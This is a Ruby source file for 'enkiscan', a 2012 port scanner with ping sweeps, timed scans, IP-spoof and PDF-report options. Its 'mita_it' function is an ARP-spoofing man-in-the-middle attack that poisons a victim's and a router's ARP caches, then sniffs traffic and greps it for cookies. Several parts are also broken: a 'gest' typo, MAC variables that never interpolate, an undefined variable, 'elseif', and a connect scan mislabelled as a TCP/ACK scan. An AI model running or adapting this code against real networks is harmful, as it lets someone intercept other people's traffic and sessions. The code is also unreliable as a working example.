#!/usr/bin/env ruby
#
# ENKI BOX PORT SCANNER
#
# Copyright (c) 2012 Enki Box (www.enki-security.com - Y Kourosh BN)
#
# This program is the property of ENKI SECURITY - ENKI BOX - Kouros.Darius
# You may use it for free and do what you want with it as we are no responsible of what's you are going to do
#
# This program is distributed in the scope of the use for experimental purpose
# We provide ANY WARRANTY, ANY SUPPORT for a use which is not compliant to our policies

require 'optparse'
require 'optparse/time'
require 'ostruct'
require 'resolv'
require 'timeout'
require 'socket'
require 'pp'
require 'prawn'

release = '0.1.0'

puts
puts "Starting 'enkiscan' #{release}"
puts "**********************************************************************************"
puts "* - enkiscan - is a part of the ENKI BOX project - [http://product.enkibox.com/] *"
puts "*              Copyright (c) 2012 Enki Box (www.enki-security.com)             *"
puts "**********************************************************************************"
puts "*                            Enter -h option for help                            *"
puts "**********************************************************************************"
puts "*  Here some examples of how you can use enkiscan 				 *"
puts "*										 *"
puts "* Full stealth TCP/ACK scan without pinging the target:				 *"
puts "* # enkiscan.rb -t [TARGET] -n -S -A						 *"
puts "*										 *"
puts "* Ping scan on a range of IPs:							 *"
puts "* # enkiscan.rb -i 192.168.5.10-192.168.5.153 -j				 *"
puts "*										 *"
puts "* Stealth scan of a range of ports on a range of IPs at a specific time		 *"
puts "* with no ping:						 			 *"
puts "* # enkiscan.rb -i 192.168.5.10-192.168.5.153 -m 80 -M 143 --time 17:10 -n	 *"
puts "**********************************************************************************"
puts

#
# Scanner class options
#

class Optscan

 def self.parse(args)

	if __FILE__ == $0

	options = OpenStruct.new
	options.target = nil
	options.range = nil
	options.portmin = 1
	options.portmax = 15665
	options.portunit = nil
	options.time = Time.now
	options.pdf = nil
	options.response = 0.2
	options.stfu = nil
	options.ack = nil
	options.ping = true
	options.jp = "no"
	options.spoof = nil
	options.mita = nil

	opts = OptionParser.new do |opts|
			script = File.basename($0)
			opts.banner = "Usage: ruby #{script} [options]"

			opts.separator ""
			opts.on("-t", "--target TARGET", "Specify the IP or the Hostname of the Target") do |t|
				if t =~ /(^(\d{1,3}\.){3}\d{1,3})|(([a-z0-9]{1,10})|(\d{1,10})\.)?([a-z0-9]{1,20})\.([a-z]{2,4})$/i;
					options.target = t;
					puts "Target IP or Hostname seems to be ok";
					puts "...";
				else
					puts "Please enter a valid IP or hostname for the target";
					puts;
					exit;
				end
			end

			opts.on("-i", "--iprange [IPmin-IPmax]", "Specify a range of IP to scan (do not forget the minus sign in your range definition)") do |iprange|
				options.range = iprange.split('-')
					if (options.range[0] =~ /(^(\d{1,3}\.){3}\d{1,3})$/i && options.range[1] =~ /(^(\d{1,3}\.){3}\d{1,3})$/i);
						puts "IP range sets to " + options.range[0] + " to " + options.range[1];
						puts "...";
						puts;
					else
						puts "IP range not valid";
						puts;
						exit;
					end
			end

			opts.on("-m", "--minport [PORT]", "Specify the minimum value of the range port(s) to scan") do |m|
				if m.to_s.length >= 1 && m.to_s =~ /\d+/;
					options.portmin = m;
					puts "Minimum value of port range sets to #{m}";
					puts;
					m.to_i;
					puts;
				end
			end

			opts.on("-M", "--maxport [PORT]", "Specify the maximum value of the range port(s) to scan") do |x|
				if x.to_s.length >= 1 && x.to_s =~ /\d+/;
					options.portmax = x;
					puts "Maximum value of port range sets to #{x}";
					puts;
					x.to_i;
					puts;
				end
			end

			opts.on("-p", "--port [PORT]", "Specify a single port to scan") do |p|
				options.portunit = p
			end

			opts.on("-R", "--response [NUM]", "Set the response timeout before trying another port") do |r|
				options.response = r
			end

			opts.on("--time [TIME]", Time, "Begin execution at given time") do |time|
				options.time = time
			end

			opts.on("--pdf", "Generate pdf report") do |pdf|
				options.pdf = "on"
			end

			opts.on("-n", "--no-ping", "Do not ping the host before scanning") do |pi|
				options.ping = false
			end

			opts.on("-S", "--stfu", "Perform strobe scanning by slowing the scan randomly") do |s|
				options.stfu = "on"
			end

			opts.on("-A", "--ACK", "Perform a TCP/ACK scan which may help you identify non-filtered ports") do |a|
				options.ack = "ack"
			end

			opts.on("--mita", "Enable capture packets mode") do |mita|
				options.mita = "on"
			end

			opts.on("--spoof IP", "Spoof your IP before each scan") do |b|
				if b =~ /(^(\d{1,3}\.){3}\d{1,3})$/i;
                                        options.spoof = b;
				else
					puts "Option Spoof: bad argument. Couldn't spoof"
					puts
					exit
                                end
                        end

			opts.on("-j", "--justping", "Perform ping scan and exit") do |j|
				options.jp = "yes"
			end
	   
			opts.on("-h", "--help", "Show this help message") { puts puts opts; exit }
			end
	end
	
	opts.parse!(args)

	options
	end
end

#
# End of class section
#

$opt = Optscan.parse(ARGV)

puts

#
# Target components
#

$range = $opt.range

def isntnull()

	if $opt.target != nil
		$ip = Resolv.getaddress($opt.target)

		begin
			Resolv.getname($ip)
			$target = Resolv.getname($ip)
		rescue
			Resolv::ResolvError
			$target = Resolv.getaddress($opt.target)
		end
	else
		puts "No target specified"
		puts "Enter -h option for help"
		puts
		exit
	end
end

$portinit = $opt.portmin
$portfin = $opt.portmax
$portunit = $opt.portunit
timeinit = $opt.time
$req = $opt.response.to_f
$stfu = $opt.stfu
$ack = $opt.ack
$jp = $opt.jp
$pdf = $opt.pdf
$mita = $opt.mita

if $stfu != nil
	puts "Stealth mode set to ON"
	puts "This may take a while so, please, be patient"
	puts
end

if $range != nil;
	$ipstart = /\A\d{1,3}\.\d{1,3}\.\d{1,3}\./i.match($range[0])
	$range_min = /\A\d{1,3}/i.match($range[0].reverse)
	$range_min = $range_min.to_s.reverse

	$ipend = /\A\d{1,3}\.\d{1,3}\.\d{1,3}\./i.match($range[1])
	$range_max = /\A\d{1,3}/i.match($range[1].reverse)
	$range_max = $range_max.to_s.reverse
end

#
# End of components section
#

#
# Need to schedule your scan?
#

unless timeinit < Time.now
	puts "Waiting for execution at #{timeinit}"
	t = timeinit - Time.now
	sleep (t)
	puts
end

#
# End of schedule elements
#

#
# Define methods for user messages
#

def messagestart()

	puts "...Started at"
	puts Time.now.asctime
	puts "..."
	puts
end

def messageend()
        
	puts
	puts "...Ended at"
	puts Time.now.asctime
	puts
end

#
# End of method definition
#

#
# Little things to do to capture STDOUT
#

def capture_stdout(&block)
        raise ArgumentError, "No block given" if !block_given?
        old_stdout = $stdout
        $stdout = sio = StringIO.new
        yield
        $stdout = old_stdout
        sio.rewind
	if $pdf != nil
		sio.read
	else
		puts sio.read
	end
end

#
# End of STDOUT def
#

#
# Stealth mode method by slowing the scan
#
def stfu()

    rtime = Time.now
    randotime = rand(rtime.sec.to_i)

    return randotime
end

#
# End of method definition
#

#
# TCP/ACK scan method
#
def ack(tgt)

	if $ack != nil

		puts
		puts "### TCP/ACK scan started ###"
		puts

		if $portunit != nil
			begin
				Timeout.timeout(2){
					ackit = TCPSocket.new("#{tgt}", $portunit.to_i)
					puts
					puts "#{$portunit} is not filtered"
					puts
					puts "### End of TCP/ACK scan ###"
					puts
					puts
					ackit.close
				}
			rescue
				Errno::ECONNREFUSED
				puts "#{$portunit} filtered or closed"
				puts
			end
		else
			cnt = 0
			($portinit.to_i..$portfin.to_i).each do |port|
				begin
					Timeout.timeout(2){
						ackit = TCPSocket.new("#{tgt}", port)
						puts
						puts "#{port} is not filtered"
						puts
						ackit.close
					}
				rescue
					Errno::ECONNREFUSED
					cnt += 1
				end
			end

			puts
			puts "#{cnt} port(s) filtered or closed"
			puts
			puts "### End of TCP/ACK scan ###"
			puts
			puts
		end
	else
		puts
		puts "Don't forget to enjoy our TCP/ACK scan!"
		puts
	end
end

#
# End of method definition
#

#
# ICMP Ping method definition
#
def ping(host)

    if $opt.ping != true;
	$ping_stat = capture_stdout do
		puts "Ping sets to silent: make sure #{host} is up before scanning"
	end
	puts "***"

    else

    #
    # Perform a checksum on the message. This is the sum of all the short
    # words and it folds the high order bits into the low order bits.
    #
    
    def checksum(msg)
	length = msg.length
	num_short = length / 2
	check = 0

	msg.unpack("n#{num_short}").each do |short|
		check += short
	end

	if length % 2 > 0
		check += msg[length-1, 1].unpack('C').first << 8
	end

	check = (check >> 16) + (check & 0xffff)
	return (~((check >> 16) + check) & 0xffff)
    end
    
    private :checksum

    @ICMP_ECHOREPLY = 0
    @ICMP_ECHO = 8
    @ICMP_SUBCODE = 0
	
    @seq = 0
    @port = 0
    @data_size = 56
    @data = ''
	
    0.upto(@data_size){ |n| @data << (n % 256).chr }

    @pid = Process.pid & 0xffff
    
    #
    # Define method to set the number of bytes sent in the ping method
    #
		    
    def data_size=(size)
	@data_size = size
    	@data = ''
    	0.upto(size){ |n| @data << (n % 256).chr }
    end
    
    #
    # Ping a host
    #
		
    $st = 1
    localhost = Socket.gethostname
  
    socket = Socket.new(Socket::PF_INET, Socket::SOCK_RAW, Socket::IPPROTO_ICMP)

    @seq = (@seq + 1) % 65536
    pstring = 'C2 n3 A' << @data_size.to_s
    timeout = 3
    
    checksum = 0
    msg = [@ICMP_ECHO, @ICMP_SUBCODE, checksum, @pid, @seq, @data].pack(pstring)

    checksum = checksum(msg)
    msg = [@ICMP_ECHO, @ICMP_SUBCODE, checksum, @pid, @seq, @data].pack(pstring)

    begin
	saddr = Socket.pack_sockaddr_in(@port, host)
	rescue Exception
	socket.close unless socket.closed?
	return $st
    end

    socket.send(msg, 0, saddr)

    begin
	Timeout.timeout(3){
	while true
		started = Time.now
		io_array = select([socket], nil, nil, timeout)

		if io_array.nil? || io_array[0].empty?
			return false
		end

		pid = nil
		seq = nil

		data = socket.recvfrom(1500).first
		type = data[20, 2].unpack('C2').first

		case type
			when @ICMP_ECHOREPLY
       				if data.length >= 28
				       	pid, seq = data[24, 4].unpack('n3')
				end
			else
				if data.length > 56
					pid, seq = data[52, 4].unpack('n3')
				end
		end

		ended = Time.now
		duration = ((ended.to_f - started.to_f) * 1000.0).to_i

		if pid == @pid && seq == @seq && type == @ICMP_ECHOREPLY
      			puts "*** Ping option set to ON"
            		puts "#{host} replied to ping"
           	 	puts "#{localhost} sent #{data.length} bytes / #{msg.length} bytes received from #{host}"
			puts "Ping takes #{duration}ms"
          	  	puts "***..."
			puts
         		$st = 0
			break
		end
	end
	}
	rescue
 		Errno::ECONNREFUSED
  		puts
  		puts "*****                                                     *****"
  		puts " Pinging: Host #{host} seem's to be down or not pingable "
  		puts "* You may try with -n option                                  *"
  		puts "*****                                                     *****"
  		puts
  		return $st = 1
		
	ensure
		socket.close if socket
    end
      
    return $st
    end
end
#
# End of method definition
#

#
# Define methods for single port scanning
#

def portuniq(sight)

	begin
		status = Timeout::timeout($req) {
		s = TCPSocket.open(sight, $portunit.to_i)
		p = Socket.getservbyport($portunit.to_i)
		s.close

		$pdf_line_port_stat = capture_stdout do
			printf "%s/%sopen\t%s\n", $portunit, 'tcp'.ljust(11 - $portunit.to_s.length), p ? p : 'unknown'
		end
		}

	rescue
		status = Timeout::timeout($req) {
		$pdf_line_port_err = capture_stdout do
			printf "%s/%s Connexion refused or port closed\t%s\n", $portunit, 'tcp'.ljust(11 - $portunit.to_s.length), p ? p : 'unknown'
		end
		Errno::ECONNREFUSED
		}
	end
end

def scanportunit()

	isntnull()

	messagestart
	
	ping($target)

	ack($target)
	
	if $ack == nil
		if $st != 1
			$pdf_line_targe_desc = capture_stdout do
			printf "Trying host %s (%s) TCP port %i\n", $target, $ip, $portunit.to_i
			end

			portuniq($target)
		end
	end
	messageend
end

#
# End of method definition
#

#
# Define method for multi ports scanning
#

def portskim(aim)
	$count = 0

	($portinit.to_i..$portfin.to_i).each do |port|

		if $stfu != nil
			randit = stfu
			var = sleep(randit)
		end

		begin
			status = Timeout::timeout($req) {
			s = TCPSocket.open(aim, port)
			p = Socket.getservbyport(port)
			pp = port
			s.close
			printf "%s/%sopen\t%s\n", pp, 'tcp'.ljust(11 - pp.to_s.length), p ? p : 'unknown'
			}
		rescue
			Errno::ECONNREFUSED
			$count += 1
			next
		end
	end

	puts
	puts "**** Summary of failed tests ****"
	puts "#{$count} port(s) seems to be closed or filtered"
	puts
end

#
# End of method definition
#

#
# Define method for complete scan
#

def scanfull()

	isntnull()

	messagestart
	
	ping($target)

	ack($target)

	if $st != 1

		printf "Trying host %s (%s) TCP ports (%i .. %i)\n", $target, $ip, $portinit.to_i, $portfin.to_i

		puts "**** Summary of open ports ****"
		printf "Port\t    State\tservice\n"

		portskim($target)
	end

	messageend
end

#
# End of method definition
#

#
# Define method for IP range scanning
#

def scanrange()

	if $range_min.to_i > $range_max.to_i
		puts "Invalid range. Values of host IP are not correct."
		puts
		exit
 	end

	messagestart

	for rng in $range_min.to_i..$range_max.to_i do
	    	
		target = $ipstart.to_s+rng.to_s

                begin
                        name = Resolv.getname(target)
                rescue
                        Resolv::ResolvError
		end

		if ($ipstart.to_s != $ipend.to_s);
			puts "Invalid range. Please specify a range of IP in the same subnet"
			puts
			exit
		end
		
		ping(target)

		if $st != 1 
			puts "#{name}"
		end

		if $jp == "yes"
			next
		end

		ack(target)

		if $ack == nil
			if $st != 1;
				if ($portunit != nil) && ($ipstart.to_s == $ipend.to_s);
			   	printf "Trying host %s - TCP ports (%i)\n", target, $portunit.to_i
			   	portuniq(target)
			   	puts "#############********************##############"

		   	elsif ($portinit != nil) && ($portfin != nil) && ($ipstart.to_s == $ipend.to_s) && ($ack == nil);
			   	printf "Trying host %s TCP ports (%i .. %i)\n", target, $portinit.to_i, $portfin.to_i
		   		portskim(target)
			   	puts "#############********************##############"

		   		else
	    			puts "Did you miss something?"
	    			puts
		    		exit
		   		end
	   		end
		end
	end

	messageend
end

#
# End of method definition
#

#
# MITA - What is MITA?
#

def mita_it()

	begin
		PacketFu::Utils.whoami?(:iface=>ARGV[0])
	rescue Exception => e
		puts "Invalid interface or permission denied"
		exit(1)
	end
	interface = ARGV[0]

	puts
	puts "Enter the victim MAC@"
	victim_mac = gets.chomp
	puts
	puts "Enter the victim IP@"
	victim_ip = gets.chomp
	puts
	puts "Enter the router MAC@"
	puts
	router_mac = gets.chomp
	puts
	puts "Enter the router IP@"
	router_ip = gest.chomp
	puts

	arp_v_constructor = PacketFu::ARPPacket.new()

	arp_v_constructor.eth_saddr = '#{our_mac}'
	arp_v_constructor.eth_daddr = '#{victim_mac}'
	arp_v_constructor.arp_saddr_mac = '#{our_mac}'
	arp_v_constructor.arp_daddr_mac = '#{victim_mac}'
	arp_v_constructor.arp_saddr_ip = '#{router_ip}'
	arp_v_constructor.arp_daddr_ip = '#{victim_ip}'
	arp_v_constructor.arp_opcode = 2

	arp_r_constructor = PacketFu::ARPPacket.new()

	arp_r_constructor.eth_saddr = '#{our_mac}'
	arp_r_constructor.eth_daddr = '#{router_mac}'
	arp_r_constructor.arp_saddr_mac = '#{our_mac}'
	arp_r_constructor.arp_daddr_mac = '#{router_mac}'
	arp_r_constructor.arp_saddr_ip = '#{victim_ip}'
	arp_r_constructor.arp_daddr_ip = '#{router_ip}'
	arp_r_constructor.arp_opcode = 2

	arp_v_constructor.to_w(@interface)
	arp_r_constructor.to_w(@interface)

	puts "Specify the interface you want to capture on"
	intf = gets.chomp
	puts

	puts "Enter filter for the capture session. This can help: http://wiki.wireshark.org/CaptureFilter"
	cap_filter = gets.chomp
	puts

	puts "Grep what you need. Example: 'ookie' for cookies"
	greped = gets.chomp
	puts

	capture_session = PacketFu::Capture.new(:iface => '#{intf}', :start => true, :promisc => true, :filter => "#{cap_filter}")

	capture_session.stream.each { |packet|
			puts "Information found" if packet =~ /#{greped}/
	}

end

#
# End of method definition
#

#
# PDF Generation
#

def generatepdf()
	if $pdf != nil
		date = Date.today.to_s

		if $portunit != nil
			Prawn::Document.generate "scanreport_#{date}.pdf" do
				font "Helvetica"
				text "Enkiscan scan result for #{$target}", :size => 18
				text "#{$pdf_line_targe_desc}"
				text "#{$ping_stat}"
				text "#{$pdf_line_port_stat}"
				text "#{$pdf_line_port_err}"
			end
		end
	end
end

#
# End of method definition
#

#
# Here you can enjoy!
#

if $mita != nil
	mita_it()
end

if $range != nil;

	scanrange;
	generatepdf();
	exit;

elseif $portunit != nil;

	scanportunit;
	generatepdf();
	exit;

else
	scanfull;
	generatepdf();
	exit;

end
# To be continued...
#
